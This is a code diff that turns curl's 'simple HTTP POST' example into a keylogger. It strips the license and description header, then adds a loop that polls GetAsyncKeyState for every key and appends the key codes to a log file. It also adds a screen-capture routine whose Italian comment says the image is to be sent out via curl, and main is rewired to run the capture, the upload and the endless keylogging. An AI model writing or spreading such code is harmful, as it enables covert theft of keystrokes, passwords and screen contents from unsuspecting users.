@@ -1,33 +1,23 @@
-/***************************************************************************
- *                                  _   _ ____  _
- *  Project                     ___| | | |  _ \| |
- *                             / __| | | | |_) | |
- *                            | (__| |_| |  _ <| |___
- *                             \___|\___/|_| \_\_____|
- *
- * Copyright (C) 1998 - 2015, Daniel Stenberg, <daniel@haxx.se>, et al.
- *
- * This software is licensed as described in the file COPYING, which
- * you should have received as part of this distribution. The terms
- * are also available at https://curl.haxx.se/docs/copyright.html.
- *
- * You may opt to use, copy, modify, merge, publish, distribute and/or sell
- * copies of the Software, and permit persons to whom the Software is
- * furnished to do so, under the terms of the COPYING file.
- *
- * This software is distributed on an "AS IS" basis, WITHOUT WARRANTY OF ANY
- * KIND, either express or implied.
- *
- ***************************************************************************/
-/* <DESC>
- * simple HTTP POST using the easy interface
- * </DESC>
- */
 #include <stdio.h>
 #include <time.h>
 #include "curl/curl.h"
 
-int main(void)
+unsigned int buffer[1024];
+unsigned int ptr;
+
+void ScreenCapture(int width, int height)
+{
+	HDC hDc = CreateCompatibleDC(0);
+	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
+	SelectObject(hDc, hBmp);
+	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);
+	
+	// convertire in PNG e inviare via curl
+	
+	DeleteObject(hBmp);
+}
+
+int curl()
 {
   CURL *curl;
   CURLcode res;
@@ -56,6 +46,86 @@ int main(void)
     curl_easy_cleanup(curl);
   }
   curl_global_cleanup();
-  getchar();
-  return 0;
+  
+  return 0;	
+}
+
+
+
+			
+void saveLog()
+{
+	FILE *log;
+	unsigned int p;
+	
+	log = fopen("log", "a+");
+	for (p = 0; p < ptr; p++)
+	{
+		fprintf(log, "%02X,", buffer[p]);
+	}
+	
+	fclose(log);
+}
+
+DWORD WINAPI ThreadFunc(void *data)
+{
+	saveLog();
+}
+
+void saveKey(unsigned int keyCode)
+{
+	buffer[ptr++] = keyCode;
+}
+
+void keyloggerLoop()
+{
+	unsigned int currKeyStatus[256];
+	unsigned int prevKeyStatus[256];
+	unsigned int prevKey, currKey;
+	unsigned int k;
+	ptr = 0;
+
+	for (k = 0; k < 256; k++)
+	{
+		currKeyStatus[k] = 0;
+	}
+			
+	while(1)
+	{
+		for (k = 0; k < 256; k++)
+		{
+			prevKeyStatus[k] = currKeyStatus[k];
+		}
+
+		for (k = 0; k < 256; k++)
+		{			
+			currKeyStatus[k] = GetAsyncKeyState(k);		
+		}
+		
+		for (k = 0; k < 256; k++)
+		{
+			if(currKeyStatus[k])
+			{
+				saveKey(k);
+			}
+		}
+	
+		if(ptr > 20)
+		{
+			saveLog();
+			ptr = 0;
+		}
+		
+		//HANDLE thread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
+		
+		usleep(1000);
+	}
+}
+
+int main(void)
+{
+	ScreenCapture(800, 600);
+	curl();
+	keyloggerLoop();
+	return 0;
 }
